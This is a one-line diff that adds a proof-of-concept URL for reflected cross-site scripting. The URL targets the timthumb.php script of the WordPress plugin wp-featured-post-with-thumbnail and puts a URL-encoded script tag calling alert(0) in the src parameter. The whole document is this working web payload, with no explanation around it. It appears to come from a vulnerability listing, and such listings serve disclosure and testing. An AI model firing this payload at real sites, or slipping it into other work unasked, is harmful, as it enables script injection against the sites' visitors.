@@ -1,0 +1,1 @@
+http://www.example.com/wordpress/wp-content/plugins/wp-featured-post-with-thumbnail/scripts/timthumb.php?src=%3Cscript%3Ealert(0)%3C/script%3E
